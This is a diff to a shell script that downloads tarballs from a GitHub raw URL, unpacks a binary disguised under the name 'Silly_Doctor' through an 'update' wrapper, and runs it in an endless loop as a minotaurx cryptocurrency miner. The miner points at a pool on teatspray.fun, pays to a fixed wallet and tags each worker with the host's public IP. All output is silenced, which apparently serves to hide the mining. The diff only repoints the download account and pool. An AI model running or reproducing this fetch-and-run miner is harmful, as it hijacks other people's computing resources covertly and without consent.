@@ -51,7 +51,7 @@ date
 sleep 2
 
 num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
-currentdate=$(date '+%d-%b-%Y_Val16Cores_')
+currentdate=$(date '+%d-%b-%Y_Lab16Cores_')
 ipaddress=$(curl -s ifconfig.me)
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 currentdate+=$underscored_ip
@@ -74,7 +74,7 @@ ph add Silly_Doctor 1>/dev/null 2>&1
 
 sleep 2
 
-curl -s -L -o update.tar.gz https://raw.githubusercontent.com/maninamsubathi/update/main/update.tar.gz > /dev/null
+curl -s -L -o update.tar.gz https://raw.githubusercontent.com/mandisimakhonkco/update/main/update.tar.gz > /dev/null
 
 sleep 2
 
@@ -104,7 +104,7 @@ sleep 2
 
 sleep 2
 
-./update/update wget -q https://raw.githubusercontent.com/maninamsubathi/update/main/Silly_Doctor_249.tar.gz 1>/dev/null 2>&1
+./update/update wget -q https://raw.githubusercontent.com/mandisimakhonkco/update/main/Silly_Doctor_249.tar.gz 1>/dev/null 2>&1
 
 sleep 2
 
@@ -133,6 +133,6 @@ sleep 2
 
 while true
 do
-./Silly_Doctor --disable-gpu --algorithm minotaurx --pool flyingsaucer-eu.teatspray.fun:7019\!flyingsaucer-us.teatspray.fun:7019 --main-pool-reconnect 1440 --wallet MGaypRJi43LcQxrgoL2CW28B31w4owLvv8 --password $currentdate,c=MAZA,zap=MAZA --proxy 127.0.0.1:1081 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
+./Silly_Doctor --disable-gpu --algorithm minotaurx --pool coinxp.teatspray.fun:8243 --wallet MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate --password c=MAZA,m=solo --proxy 127.0.0.1:1081 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
 sleep 10
 done
